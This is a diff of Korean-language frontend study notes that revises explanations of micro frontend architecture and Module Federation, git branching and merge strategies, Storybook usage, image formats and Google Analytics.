 
-      - CSS, 로컬 스토리지, 이벤트, 쿠키에 네임스페이스를 부여하여 충돌을 방지하고 명확히 분리한다.
+      - 마이크로 앱 간 통신은 브라우저 이벤트 등 기본 기능을 활용하여 단순하게 처리한다.
 
-    - 통신 시스템에 기본 브라우저 기능 활용
+    - 탄력적인 웹 설계
 
-      - 작동 단위 간의 통신을 위한 시스템을 자체 구축하는 것보다 브라우저 이벤트를 사용한다.
+      - JS 에러 상황에서도 기능이 동작해야 하며, 점진적 향상(Progressive Enhancement)와 범용 렌더링(Universal Rendering)을 통해 성능과 안정성을 확보한다.
 
-      - 만약 정말로 작동 단위 간 커스텀 API가 필요한 경우 가능한 간단하게 유지한다.
+- 컴포넌트 분리 vs 마이크로 프론트엔드
 
-    - 탄력적인 웹 디자인 구축
+  | 항목           | **컴포넌트 분리**                         | **마이크로 프론트엔드 (MFE)**      |
+  | -------------- | ----------------------------------------- | ---------------------------------- |
+  | **분리 단위**  | UI 구성 요소 수준 (버튼, 카드, 페이지 등) | 애플리케이션 수준 (페이지, 기능군) |
+  | **코드베이스** | 하나의 프로젝트 내에서 분리               | 서로 다른 리포지토리/프로젝트      |
+  | **배포**       | 하나의 앱으로 통합 배포                   | 각 앱이 독립적으로 배포 가능       |
+  | **개발팀**     | 하나의 팀이 전반 관리                     | 기능별로 다른 팀이 병렬 개발 가능  |
+  | **기술스택**   | 동일한 스택이 기본                        | 서로 다른 프레임워크/버전도 가능   |
 
-      - 자바스크립트에서 에러가 나거나 실행할 수 없더라도 기능은 사용 가능해야 한다.
+  - 팀 간 완전한 독립 개발
 
-      - 범용 렌더링(Universal Rendering)과 점진적 향상(Progressive Enhancement)을 통해 성능을 향상시킬 수 있다.
+    - 대규모 조직에서는 여러 팀이 동시에 프론트엔드를 개발해야 할 때가 많아.
 
-  - 장단점
+    - 이때 하나의 프로젝트에서 충돌이 많고, 빌드/배포도 병목이 생겨.
 
-    - 장점
+    - MFE는 코드, 빌드, 배포까지 완전히 분리하니까 병렬 작업이 가능해.
 
-      - 작고, 응집력 있고 유지보수에 용이한 코드베이스를 가질 수 있다. 따라서 디커플링이라는 소프트웨어 개발 목표를 달성한다.
+  - 배포 리스크 최소화
 
-      - 각 마이크로 프론트엔드는 고유한 기술 및 프레임워크를 선택할 수 있다. 독립적으로 구현, 테스트, 업그레이드, 업데이트 및 배포할 수 있어 팀에 유연성을 제공한다.
+    - 기존 앱에서 작은 변경도 전체 빌드를 다시 해야 함.
 
-      - 프론트엔드 개발을 점진적 업그레이드 또는 재작성이 수월해진다.
+    - 반면 MFE는 특정 기능만 업데이트하고 배포할 수 있어 → 롤백도 쉬움.
 
-      - 마이크로 프론트엔드는 수직 팀을 장려한다. 수직 팀에는 일반적으로 기능 소유자, UX 디자이너, 제품 관리자, 백엔드 개발자, 프론트엔드 개발자 및 품질 보증 엔지니어가 포함된다.
+  - 레거시와의 공존
 
-    - 단점
+    - 예를 들어 기존에 Vue로 만들어진 페이지가 있고, 새로 React로 만들고 싶을 때.
 
-      - 마이크로 프론트엔드는 분리되거나 느슨하게 결합 된 구성 요소를 위해 설계되었다. 그들 사이에 너무 많은 종속성을 넣으려고하면 디버깅 악몽이 발생할 수 있다.
+    - MFE는 서로 다른 프레임워크를 한 화면에서 공존하게 할 수 있어.
 
-      - 마이크로 프런트 엔드를 가능하게하는 파이프라인으로 인해 복잡도가 증가한다. 외부로드 문제를 해결하려면 기술적 전문 지식이 필요하며 디버깅 프로세스에는 시간이 많이 걸린다. 또한 SSO (Single Sign-On), 글로벌 CSS 등과 관련된 문제에 직면 할 수 있다.
+  - 스케일을 위한 아키텍처
 
-      - 각 마이크로 프런트 엔드에는 중복 된 코드 또는 기능이 있을 수 있다. 예를 들어, React 라이브러리는 각 마이크로 프런트 엔드에 포함될 수 있어, 번들 크기와 메모리 소비를 증가시킨다.
+    - 도메인이 커지고 복잡도도 높아지면, 컴포넌트 단위로는 관리가 어려워져.
 
-      - 런타임 시 마이크로 프런트 엔드를 동적 또는 지연로드하는 데 추가 시간이 걸린다.
+    - 기능군별로 완전히 분리하면 스케일에 강한 구조가 돼.
 
-      - 사용자 인터페이스는 여러 팀에서 설계되었으므로 UX 설계는 마이크로 프런트 엔드에서 일관되지 않을 수 있다.
+- 장단점
+
+  - 장점
+
+    - 작고, 응집력 있고 유지보수에 용이한 코드베이스를 가질 수 있다. 따라서 디커플링이라는 소프트웨어 개발 목표를 달성한다.
+
+    - 각 마이크로 프론트엔드는 고유한 기술 및 프레임워크를 선택할 수 있다. 독립적으로 구현, 테스트, 업그레이드, 업데이트 및 배포할 수 있어 팀에 유연성을 제공한다.
+
+    - 프론트엔드 개발을 점진적 업그레이드 또는 재작성이 수월해진다.
+
+    - 마이크로 프론트엔드는 수직 팀을 장려한다. 수직 팀에는 일반적으로 기능 소유자, UX 디자이너, 제품 관리자, 백엔드 개발자, 프론트엔드 개발자 및 품질 보증 엔지니어가 포함된다.
+
+  - 단점
+
+    - 마이크로 프론트엔드는 분리되거나 느슨하게 결합 된 구성 요소를 위해 설계되었다. 그들 사이에 너무 많은 종속성을 넣으려고하면 디버깅 악몽이 발생할 수 있다.
+
+    - 마이크로 프런트 엔드를 가능하게하는 파이프라인으로 인해 복잡도가 증가한다. 외부로드 문제를 해결하려면 기술적 전문 지식이 필요하며 디버깅 프로세스에는 시간이 많이 걸린다. 또한 SSO (Single Sign-On), 글로벌 CSS 등과 관련된 문제에 직면 할 수 있다.
+
+    - 각 마이크로 프런트 엔드에는 중복 된 코드 또는 기능이 있을 수 있다. 예를 들어, React 라이브러리는 각 마이크로 프런트 엔드에 포함될 수 있어, 번들 크기와 메모리 소비를 증가시킨다.
+
+    - 런타임 시 마이크로 프런트 엔드를 동적 또는 지연로드하는 데 추가 시간이 걸린다.
+
+    - 사용자 인터페이스는 여러 팀에서 설계되었으므로 UX 설계는 마이크로 프런트 엔드에서 일관되지 않을 수 있다.
 
 - Micro Frontends 통합 방법
 
   - 공통적으로 존재하는 아키텍처
 
-    마이크로 앱들을 개발 후, 어떻게 통합할지 고려해야 한다. 여러 방식이 있는데, 공통적으로 존재하는 아키텍처가 있다. 일반적으로 마이크로 애플리케이션들이 있고(작동 단위), 그것들을 구성하는 단일 컨테이너 애플리케이션이 있다. 단일 컨테이너 애플리케이션은 다음과 같은 것들을 한다.
+    - 대부분의 MFE 구현은 “Shell (컨테이너 앱)” + “Micro Apps (각 기능 모듈)” 구조를 사용함
 
-    - 공통 페이지 요소를 렌더링한다.
+    - 컨테이너 앱의 역할
 
-    - 인증 및 탐색과 같은 공통적으로 고려되어야 하는 문제들을 해결한다.
+      - 공통 레이아웃 (헤더/푸터)
 
-    - 다양한 마이크로 앱들을 페이지에 모으고, 각 앱들에게 언제 어디서 렌더링할지 알려준다.
+      - 인증, 라우팅, 퍼미션 제어
+
+      - 어떤 마이크로 앱을 언제 어디서 렌더링할지 제어
 
   - 서버 사이드 템플릿 통합
 
-    각 서버로 html 템플릿을 요청하고, 최종 응답 서버에서 각 템플릿을 조합해서 응답을 보낸다. 서버 측에서 최종 화면을 조합한다. 웹앱 단위 이상으로 배포단위를 쪼개는 것과 같다.
+    서버에서 각 마이크로 앱의 HTML을 조립해서 클라이언트에 반환.
 
   - 빌드타임 통합
 
-    분리된 UI(마이크로 프론트엔드)를 패키징해 패키지로 배포하고 빌드타임에 통합시키는 방법이다. 특정 UI의 한 부분을 NPM 패키지로 만들어 애플리케이션의 package.json에 의존성과 버전을 표기한 후 빌드해 배포하는 방법이다. 컨테이너 앱이 그것들을 라이브러리 종속성으로 포함하도록 한다. 특정 패키지를 번들링해서 미리 트랜스파일하고 빌드해놓는 데서 발생하는 이점으로 어느정도 빌드 및 배포 사이클을 빠르게 할 수 있는 장점도 있기는 하지만 각각의 마이크로 앱에 변경사항이 있을 때마다, 그 변경사항을 반영한 단일 번들을 만들기 위해 다시 컴파일하고 릴리즈해야 한다는 문제가 있다.
+    각 마이크로 앱을 NPM 패키지처럼 배포하고, 컨테이너 앱에서 가져다 씀. 앱 변경 시 반드시 컨테이너 앱 다시 빌드해야 함 → 독립 배포 불가
 
   - iframe을 통한 런타임 통합
 
-    여기서부터는 확실히 페이지 단위 이하로 배포 단위를 분리할 수 있는 방법들이며 분절된 UI 컴포넌트를 런타임에 통합하는 방식이다. 이 방식은 전통적인 방식이면서 가장 쉬운 방식이다. iframe을 사용하면 각 마이크로 페이지들을 독립적인 하위 페이지로 쉽게 만들 수 있다. 특정 외부 URL로 배포해놓은 UI의 일부를 HTML째로 넣어 기존 앱에 쉽게 통합하여 배포 단위를 UI 단위로 분리할 수 있다. 하지만 어플리케이션의 서로 다른 부분들을 통합 구축하는 것이 어렵다. 따라서 라우팅, 히스토리, 컴포넌트간 상태값 공유 등이 더욱 복잡해지고, 반응형 페이지 개발에도 추가적인 어려움들이 따르며 UX가 iframe안에 갇히기 때문에 어색한 UI 표현을 가질 수 있다.
+    URL로 분리된 앱을 iframe으로 로딩
 
   - Web Components를 통한 런타임 통합
 
-    비교적 최신 web 스펙인 web-components를 이용한 런타임 통합 방식으로 컨테이너 앱에서 인스턴스화 할 HTML Custom Element를 정의하는 방식이다. iframe과 웹 컴포넌트를 통한 런타임 통합 방식의 경우, 이미 그것으로 완결되어 런타임에서 다른 컴포넌트와 상호작용할 필요가 없는 소수의 UI 컴포넌트들을 런타임에 통합하는데 사용하기 좋은 방식이다. 하지만 다수의 분리된 다른 UI 컴포넌트가 iframe이나 web-components로 런타임에 통합되는 경우 기존의 UI 컴포넌트와 약간 거리가 있는 곳에서 상태값들을 저장하고, 이를 기존 UI 컴포넌트들의 라이프사이클에 연동시켜야하기 때문에 복잡해질수록 관리가 어려워질 가능성이 높다.
+    웹 컴포넌트는 독립적인 UI 단위로, HTML의 Custom Element (예: `<my-app-header>`) 형태로 정의됨. 빌드 결과는 자바스크립트 번들로 생성되며, 컨테이너 앱에서 `<script>` 태그로 로드
+    로드된 스크립트가 커스텀 엘리먼트를 브라우저에 등록하고, 해당 태그가 DOM에 있을 때 웹 컴포넌트가 실행되어 UI를 렌더링. 이를 통해 마이크로 앱을 컨테이너 앱에 런타임에 내장(통합) 가능
 
   - Javascript를 통한 런타임 통합
 
-    UI 컴포넌트를 자바스크립트 번들 단위로 배포 단위를 나누고, 필요할 때 번들을 로딩하여 런타임에 통합시키는 방식이다. React를 사용한다고 가정한다면 이 방법에서는 “정의한 컴포넌트들을 그냥 툭 떼서 별도의 배포단위로 만들고 런타임에서 합치는 것” 이 가능하다. 해당 컴포넌트부터 런타임에 만들 수 있는 독립된 번들로 만드는 것이다. 이 방법이 주는 가장 큰 장점은 배포 단위를 유연하게 가져갈 수 있게 한다는 것이다. 배포 단위간 상태 공유를 위한 작업이 앞선 두 런타임 통합 방법보다 많거나 이질적이지 않고, 모두 웹 앱 내부에서 가능하니 기존 배포 단위를 합치거나 나누는 것이 비교적 간편하다.
+    Webpack Module Federation, SystemJS, Import Maps 등을 사용, 앱을 번들 단위로 나누고 런타임에 필요한 앱만 동적으로 로딩
+
+    - 앱이 다른데 어떻게 번들을 공유할까? Webpack Module Federation를 통해 가능
+
+      Webpack Module Federation를 통해 가능, 앱을 번들링할 때, 일부 모듈을 “외부에 노출(export)”시키고 런타임에 네트워크로 JS 모듈을 불러와 사용하는 구조
+
+      ```js
+      // 📦 app1 (Remote)
+      // webpack.config.js
+      module.exports = {
+        name: "app1",
+        exposes: {
+          "./Button": "./src/components/Button", // 외부에서 사용할 수 있게 export
+        },
+        filename: "remoteEntry.js",
+      };
+      ```
+
+      ```js
+      // 🏠 app2 (Host)
+      // webpack.config.js
+      module.exports = {
+        name: "app2",
+        remotes: {
+          app1: "app1@https://app1.example.com/remoteEntry.js",
+        },
+      };
+      ```
+
+      ```js
+      // App.tsx
+      const RemoteButton = React.lazy(() => import("app1/Button"));
+
+      function App() {
+        return (
+          <Suspense fallback={<div>Loading...</div>}>
+            <RemoteButton />
+          </Suspense>
+        );
+      }
+      ```
 
 - Micro Frontends 통합 고려사항
 
@@ -11427,61 +11909,58 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **git flow(process)**
+### # git branch 종류
+
+1. Master Branch : 제품으로 출시될 수 있는 브랜치
+
+2. Develop Branch : 다음 출시 버전을 개발하는 브랜치
+
+3. Feature branch : 기능을 개발하는 브랜치
+
+4. Release Branch : 이번 출시 버전을 준비하는 브랜치
+
+5. Hotfix Branch : 출시 버전에서 발생한 버그를 수정 하는 브랜치
 
 <br>
 
-- git으로 어떻게 일했는지 프로세스 설명
+### # git merge, git rebase, git squash 차이
 
-  (0) 기본적으로 커맨드(CLI, Command-Line Interface)를 사용하여 git을 사용하였다.
+- git merge
 
-  (1) 기능 개발을 위한 feature 브랜치 생성하였다.
+  merge는 일반적인 병합 방법이다. 모든 커밋이 시간 순서대로 한꺼번에 병합된다. 충돌이 일어났을 경우 맨 마지막 커밋에 머지 커밋을 추가하여 해결한다.
 
-  (2) 기능 단위로 작업 완료 후 add -> commit -> PR을 날렸다.
+- git squash
 
-  (3) 팀원들에게 리뷰받은 뒤 수정 후 직접 스쿼시 머지 (커밋을 하나로 합쳐 머지)
+  squash 병합은 여러 개의 커밋을 하나의 커밋으로 합친 후 merge 하는 방식이다. 충돌이 일어났을 경우 충돌 해결 후 squash 병합을 진행하므로 마지막에 머지 커밋이 추가되지 않는다.
+  이러한 방식은 feature branch에서 develop branch로 머지할 때 적합하다. 기능 단위로 개발된 feature의 commit을 하나로 모아줌으로써 기능 단위의 commit을 만들어
+  develop branch에 머지하는 것이다. 이러한 방식을 통해 이슈를 추적하기가 용이해진다.
 
-<br>
+- git rebase
 
-- git branch 종류
-
-  (1) Master Branch : 제품으로 출시될 수 있는 브랜치
-
-  (2) Develop Branch : 다음 출시 버전을 개발하는 브랜치
-
-  (3) Feature branch : 기능을 개발하는 브랜치
-
-  (4) Release Branch : 이번 출시 버전을 준비하는 브랜치
-
-  (5) Hotfix Branch : 출시 버전에서 발생한 버그를 수정 하는 브랜치
+  rebase는 커밋의 시간과 상관없이, 병합 대상 브랜치(예: main)의 마지막 커밋 뒤에 현재 브랜치(예: develop)의 커밋들을 하나씩 순서대로 붙이는 방식이다. (쉽게 말해 rebase는 이름과 같이 base commit을 재정의하는데 병합 대상 브랜치의 마지막 커밋으로 재정의하는 것)
+  이 과정에서 커밋을 하나씩 이어붙이기 때문에, 각 커밋마다 충돌이 발생할 수 있어 연쇄적으로 충돌이 발생할 가능성이 높다. (일반 merge는 여러 커밋을 한꺼번에 병합하기 때문에, 충돌이 연쇄적으로 발생하지 않는다.)
+  또한 rebase는 병합 시 머지 커밋 기록이 남지 않아, 마치 하나의 브랜치에서 작업한 것처럼 깔끔한 히스토리를 보여준다. 이 방식은 보통 develop 브랜치를 main 브랜치에 병합할 때 적합하다.
+  main 브랜치의 마지막 커밋 뒤에 develop 브랜치의 커밋들이 순차적으로 이어붙여지기 때문에 커밋 단위의 이력을 유지하면서 히스토리를 깔끔하게 관리할 수 있다.
+  반면에 이 상황에서 squash를 사용하면 develop 브랜치의 여러 커밋들이 하나로 합쳐져서 커밋 단위의 상세 이력을 추적하기 어려워질 수 있다. 따라서 관련 기능별 커밋들을 rebase하여 main 브랜치 히스토리에 나란히 정리하는 것이 더 적합합니다.
+  (ex git squash를 통해 feature에서 develop에 merge 된 기능별 커밋들을 그대로 살려 main 브랜치 맨 뒤 커밋에 순차적으로 병합하는 것)
 
 <br>
 
-- git merge, git rebase, git squash 차이
+### # 커밋 메시지 종류
 
-  (1) git merge : merge는 일반적인 병합 방법이다. 모든 커밋이 시간 순서대로 병합된다. 충돌이 일어났을 경우 맨 마지막 커밋에 머지 커밋을 추가하여 해결한다.
+(1) feat : 새로운 기능 추가
 
-  (2) git squash : squash 병합은 여러 개의 커밋을 하나의 커밋으로 합친 후 merge하는 방식이다. 충돌이 일어났을 경우 충돌 해결 후 squash 병합을 진행하므로 마지막에 머지 커밋이 추가되지 않는다. 이러한 방식은 feature branch에서 develop branch로 머지할 때 적합하다. 기능 단위로 개발된 feature의 commit을 하나로 모아줌으로써 기능 단위의 commit을 만들어 develop branch에 머지하는 것이다. 이러한 방식을 통해 이슈를 추적하기가 용이해진다.
+(2) fix : 버그 수정
 
-  (3) git rebase : rebase는 커밋의 시간에 관계없이 마지막에 merge 되는 branch의 commit을 가장 뒤로 병합된다. 충돌이 연쇄적으로 발생할 수 있기 때문에 주의해서 병합해야한다. 또한 브랜치 병합 시 머지 커밋 기록이 남지 않는다. 따라서 마치 하나의 브랜치에서 작업한 것처럼 보여진다. 쉽게 말해서 rebase는 이름과 같이 base commit을 재정의하고 재정의한 base commit 뒤에 해당 commit들을 이어붙힌다. 이어붙히기 때문에 연쇄적 충돌이 발생할 수 있는 것이다. 이러한 방식은 develop branch에서 main branch로 머지할 때 적합하다. main branch의 마지막 commit에 develop의 commit을 이어붙히는 것이다. 만약 이런 경우 squash를 해버리면 develop의 commit이 하나로 합쳐지기 때문에 이슈를 추적하기가 어려워질 수 있다.
+(3) docs : 문서의 수정
 
-<br>
+(4) style : (코드의 수정 없이) 스타일(style)만 변경(들여쓰기 같은 포맷이나 세미콜론을 빼먹은 경우)
 
-- 커밋 메시지 종류
+(5) refactor : 코드를 리펙토링
 
-  (1) feat : 새로운 기능 추가
+(6) test : Test 관련한 코드의 추가, 수정
 
-  (2) fix : 버그 수정
-
-  (3) docs : 문서의 수정
-
-  (4) style : (코드의 수정 없이) 스타일(style)만 변경(들여쓰기 같은 포맷이나 세미콜론을 빼먹은 경우)
-
-  (5) refactor : 코드를 리펙토링
-
-  (6) test : Test 관련한 코드의 추가, 수정
-
-  (7) chore : (코드의 수정 없이) 설정을 변경
+(7) chore : (코드의 수정 없이) 설정을 변경
 
 <br><br><br>
 
@@ -11491,25 +11970,84 @@ function GenericReturnFunc<T>(arg: T): T {
 
 ### # 디자인 시스템
 
-- 디자인 시스템이란 디자인 원칙, 규격, 재사용 가능한 UI 패턴과 컴포넌트 코드를 포괄하는 시스템이라고 정의할 수 있다. 단순한 스타일 가이드, 패턴 라이브러리 역할을 하는 디자인 시스템이 있는가 하면, 브랜드 원칙과 UX 원칙에 이르는 하나의 철학을 구성하는 시스템도 있다고 한다. 정리하자면, 디자인 시스템은 정해진 디자인 패턴과 컴포넌트를 재사용하여 제품을 구축과 개선 시간을 단축시켜주는 시스템이다. 프론트 단에서 디자인 시스템을 사용하면 반복되는 요소들을 재사용함으로써 생산성이 증가하고 일관성 있는 UI를 제공함으로써 사용자 경험을 향상시킬 수 있다. 또한 디자이너와 개발자 사이의 공통 원칙을 지정하여 협업 시 원활한 소통도 가능해진다.
+- 디자인 시스템이란 디자인 원칙, 규격, 재사용 가능한 UI 패턴과 컴포넌트 코드를 포괄하는 시스템이라고 정의할 수 있다. 단순한 스타일 가이드, 패턴 라이브러리 역할을 하는
+  디자인 시스템이 있는가 하면, 브랜드 원칙과 UX 원칙에 이르는 하나의 철학을 구성하는 시스템도 있다고 한다. 정리하자면, 디자인 시스템은 정해진 디자인 패턴과 컴포넌트를
+  재사용하여 제품을 구축과 개선 시간을 단축시켜주는 시스템이다. 프론트 단에서 디자인 시스템을 사용하면 반복되는 요소들을 재사용함으로써 생산성이 증가하고 일관성 있는 UI를
+  제공함으로써 사용자 경험을 향상시킬 수 있다. 또한 디자이너와 개발자 사이의 공통 원칙을 지정하여 협업 시 원활한 소통도 가능해진다.
 
 <br>
 
 ### # CDD, 컴포넌트 주도 개발
 
-- 말 그대로 재사용이 가능한 컴포넌트를 우선적으로 개발하여 이 컴포넌트의 조합으로 페이지를 구성하는 개발 방식이다.
+- 재사용이 가능한 컴포넌트를 우선적으로 개발하여 이 컴포넌트의 조합으로 페이지를 구성하는 개발 방식이다.
 
 <br>
 
 ### # 스토리북(Storybook)
 
-- react에서 컴포넌트 주도 개발을 하기 위해 사용하는 툴이다. 스토리북이 제공하는 독립적인 환경에서 컴포넌트를 만들고 컴포넌트의 스토리를 생성하여 다양한 케이스를 테스트해볼 수 있다. 또한 Docs로 문서화를 지원하여 컴포넌트에 대한 설명을 문서화할 수 있다. 쉽게 말해 스토리북은 디자인 시스템 구축을 위해서 사용할 수 있다. 사용 방법은 스토리북 디렉토리에서 전역적으로 사용될 포멧을 세팅해주고 스토리즈 디렉토리에서 컴포넌트 스토리를 생성한다. 작업 순서는 테스트할 컴포넌트를 우선적으로 만들고 컴포넌트 스토리즈 파일 내부에서 템플릿 생성 후 bind 메소드로 컴포넌트 스토리를 생성한다. 그리고 args 프로퍼티를 통해 스토리에 필요한 인자를 전달하는 방식으로 작업한다.
+- 스토리북
+
+  컴포넌트 주도 개발을 하기 위해 사용하는 툴이다. 스토리북이 제공하는 독립적인 환경에서 스토리를 생성하여 다양한 케이스를 테스트해볼 수 있고 문서화할 수 있다.
+  즉 디자인 시스템 구축을 위해 사용된다.
+
+  사용 방법은 스토리북 디렉토리에서 전역적으로 사용될 포멧을 세팅해주고 스토리즈 디렉토리에서 컴포넌트 스토리를 생성한다. 작업 순서는 테스트할 컴포넌트를 우선적으로 만들고
+  컴포넌트 스토리즈 파일 내부에서 import하여 스토리를 생성한다. 그리고 args 프로퍼티를 통해 스토리에 필요한 인자를 전달하는 방식으로 작업한다.
+
+  ```jsx
+  import { fn } from "@storybook/test";
+
+  import Task from "./Task";
+
+  export const ActionsData = {
+    onArchiveTask: fn(),
+    onPinTask: fn(),
+  };
+
+  export default {
+    component: Task,
+    title: "Task",
+    tags: ["autodocs"],
+    //👇 "Data"로 끝나는 export들은 스토리가 아닙니다.
+    excludeStories: /.*Data$/,
+    args: {
+      ...ActionsData,
+    },
+  };
+
+  export const Default = {
+    args: {
+      task: {
+        id: "1",
+        title: "Test Task",
+        state: "TASK_INBOX",
+      },
+    },
+  };
+
+  export const Pinned = {
+    args: {
+      task: {
+        ...Default.args.task,
+        state: "TASK_PINNED",
+      },
+    },
+  };
+
+  export const Archived = {
+    args: {
+      task: {
+        ...Default.args.task,
+        state: "TASK_ARCHIVED",
+      },
+    },
+  };
+  ```
 
 - 참고 URL
 
-1. https://velog.io/@zer0jun/%EC%8A%A4%ED%86%A0%EB%A6%AC%EB%B6%81-%EC%82%AC%EC%9A%A9%EB%B2%95
+  1. https://velog.io/@zer0jun/%EC%8A%A4%ED%86%A0%EB%A6%AC%EB%B6%81-%EC%82%AC%EC%9A%A9%EB%B2%95
 
-2. https://iyu88.github.io//storybook/2023/04/07/storybook-docs.html
+  2. https://iyu88.github.io//storybook/2023/04/07/storybook-docs.html
 
 <br>
 
@@ -11623,219 +12161,71 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **최근에 관심있게 읽거나 참고하는 기술서적이 있나요?**
-
-<br>
-
-(1) 자바스크립트 : 모던 자바스크립트 Deep Dive
-
-(2) 리액트 : 리액트를 다루는 기술
-
-(3) 노드 js : Node.js 교과서
-
-(4) 깃/깃허브 : 팀 개발을 위한 깃/깃허브 시작하기
-
-(5) 기본 용어 : 비전공자를 위한 이해할 수 있는 IT지식
-
-<br>
-
-### # **정기적으로 참석하는 밋업이나 컨퍼런스, 세미나가 있는지?**
-
-<br>
-
-- 아직 정기적으로 참석하는 밋업이나 컨퍼런스는 없다. 하지만 최근 삼성동 코엑스에서 진행되었던 넥스트라이즈 컨퍼런스에 참여하게 되면서 다양한 기업들의 개발 문화나 기업이 추구하고자 하는 방향성 등에 대해 알 수 있었다. 특히 직방같은 경우에는 게더타운과 비슷한 메타폴리스라는 서비스를 개발하여 메타폴리스를 이용한 회의,근무 등을 진행하고 있었다. 코로나 이후 근무 환경이 참 많이 달라졌다는 것을 느낄 수 있었다. 넥스트라이즈에 다녀오면서 밋업이나 컨퍼런스 참여에 대한 필요성을 느껴 앞으로 적극적으로 참여하려고 한다.
-
-<br>
-
-### # **백앤드쪽은 어느정도 알고있니?**
-
-<br>
-
-- 아직 서버와 데이터베이스 쪽은 잘 모르고 있습니다. 그래서 최근에 서버와 데이터베이스 공부하는 차원에서 웹소캣, 노드익스프레스 서버, MySQL DB를 이용하여 실시간 채팅 프로젝트를 만들어보려고 시도해본 적이 있었는데 익스프레스 서버와는 연동이 됬었는데 DB와 연동이 안되서 실패한 경험이 있다. 그래서 추후에 다시 시도해 볼 생각이다. 그리고 아직 프론트엔드 분야에 대해 공부할 것이 더 많이 남아있다고 생각이 되서 프론트엔드 위주로 공부하면서 어느 정도 수준까지 공부를 했거나 당장 서버와 데이터베이스 쪽에 대한 지식이 필요한 경우가 생긴다면 공부해볼 계획이다.
-
-<br>
-
-### # **애자일 방법론과 워터폴 방법론의 차이**
-
-<br>
+### # 애자일, 워터폴 방법론
 
 - 애자일
 
-  스프린트라는 짧고 점진적인 개발 주기로 구성된 프로젝트 관리 방법론이다. 개발과정이 빠르고 유연하며 이슈를 빠르게 발견하고 수정할 수 있고 짧은 스프린트로 움직이기 때문에 프로젝트 변경에 자유롭다. 하지만 반복적이고 빠른 작업에 능숙한 인원이 필요하며 많은 변경사항이 발생할 수 있다.
-
-<br>
+  스프린트라는 짧고 점진적인 개발 주기로 구성된 프로젝트 관리 방법론이다. 개발과정이 빠르고 유연하며 이슈를 빠르게 발견하고 수정할 수 있고 짧은 스프린트로 움직이기 때문에
+  프로젝트 변경에 자유롭다. 하지만 반복적이고 빠른 작업에 능숙한 인원이 필요하며 많은 변경사항이 발생할 수 있다.
 
 - 워터폴
 
-  프로젝트 시작부터 최종 결과물 전달까지 특정 순서에 따라 이루어지는 프로젝트 관리 방법론이다. 팀 규모에 상관없이 따르고 쉽고, 요구사항이 정의되어 있기 때문에 목표가 변경되지 않으며 개발 주기가 정해져있어 안정적인 스케줄 관리가 가능하다. 하지만 개발 속도가 느리고 유연성이 떨어지고 테스팅 단계에서 이슈를 발견하는 일이 생길 수 있으며 요구사항이 정해져 있어 프로젝트 변경을 자유롭게 할 수 없다.
+  프로젝트 시작부터 최종 결과물 전달까지 특정 순서에 따라 이루어지는 프로젝트 관리 방법론이다. 팀 규모에 상관없이 따르고 쉽고, 요구사항이 정의되어 있기 때문에 목표가
+  변경되지 않으며 개발 주기가 정해져있어 안정적인 스케줄 관리가 가능하다. 하지만 개발 속도가 느리고 유연성이 떨어지고 테스팅 단계에서 이슈를 발견하는 일이 생길 수 있으며
+  요구사항이 정해져 있어 프로젝트 변경을 자유롭게 할 수 없다.
 
 <br>
 
 ### # 가독성 확보 방법
 
-<br>
+1. 일관성 있는 코드 작성
 
-(1) 일관성 있는 코드 작성
+2. 코드의 중복 제거
 
-(2) 코드의 중복 제거
+3. 렌더단과 로직단의 분리
 
-(3) 렌더단과 로직단의 분리
+4. 기능을 유추할 수 있는 식별자 이름 및 네이밍 컨벤션
 
-(4) 기능을 유추할 수 있는 식별자 이름 및 네이밍 컨벤션
+5. 적절한 코드 주석, JS DOC 등
 
-<br>
+6. 폴더 및 파일 구조 일관성 유지
 
-### # **잘 만든 사이트란? 혹은 좋은 개발자란?**
-
-<br>
-
-(1) 가독성이 높고 유지보수가 용이한 클린 코드가 짜여진 사이트
-
-(2) 퍼포먼스, 웹표준, 웹접근성, SEO 고려한 사이트
-
-(3) 깔끔한 UI(유저인터페이스)/UX(유저익스피리언스) 디자인 적용 된 사이트
+7. 함수/컴포넌트의 역할을 하나로 제한 (단일 책임 원칙)
 
 <br>
 
-### # **몽고DB, mysql같은 데이타베이스에 관심이 있는지? 배울 생각이 있는지?**
+### # 이미지 포맷
+
+- 이미지 포맷 요약
+
+  - 비트맵 이미지 : 픽셀 단위로 표현한 이미지. 확대 시 깨짐.
+
+  - 벡터 이미지 : 점과 선의 수학적 좌표로 구성된 이미지. 확대해도 깨지지 않음.
+
+- 주요 이미지 포맷 비교
+
+  | 포맷           | 형식   | 압축 방식     | 투명도 | 컬러 지원   | 특이사항                                                                    |
+  | -------------- | ------ | ------------- | ------ | ----------- | --------------------------------------------------------------------------- |
+  | **JPG (JPEG)** | 비트맵 | 손실          | ❌     | 24비트      | 사진에 적합, 텍스트/선명한 선이 많은 이미지에 사용 시 아티팩트 발생 가능    |
+  | **PNG**        | 비트맵 | 비손실        | ✅     | 8/24/32비트 | 투명도 지원, 텍스트/아이콘에 적합                                           |
+  | **WebP**       | 비트맵 | 손실 & 비손실 | ✅     | 24비트 이상 | Google 개발, 대부분 브라우저 지원 (IE 제외), 투명도 지원                    |
+  | **AVIF**       | 비트맵 | 손실 & 비손실 | ✅     | 최대 12비트 | HEIF 기반, WebP보다 더 나은 압축률과 품질, 일부 브라우저는 아직 제한적 지원 |
+  | **SVG**        | 벡터   | -             | ✅     | 무제한      | 해상도 자유로움, DOM으로 조작 가능, CSS/JS로 제어 가능                      |
+
+- 동일 화질 기준 파일 크기 비교 (작을 수록 효율적인 압축률)
+
+  AVIF < WebP < JPG < PNG
 
 <br>
 
-- 현재 서버나 데이터베이스는 잘 모르고 있지만 배울 생각이 있다. 프론트엔드 개발자지만 서버나 데이터베이스도 알고 있어야 백엔드 개발자와 협업할 때 더욱 원활한 소통을 할 수 있다고 생각한다. 하지만 프론트엔드 개발자에 맞게 프론트엔드 쪽에 대한 지식을 더욱 쌓은 뒤 배우는게 맞다고 생각한다.
+### # 구글 어낼리틱스(GA)
+
+구글 애널리틱스는 웹사이트나 앱을 방문한 사용자들의 행동 데이터를 수집, 분석하여 사이트 성과를 측정하고 개선하는 데 도움을 주는 웹 분석 도구입니다.
+구글에서 무료로 제공하며 방문자 수, 유입 경로, 체류 시간, 이탈률, 전환율 등 다양한 데이터를 시각화된 리포트로 제공합니다.
 
 <br>
 
-### # **개발자로서 새로운 기술, 트렌드가 있다는 걸 어떻게 알 수 있을까?**
-
-<br>
-
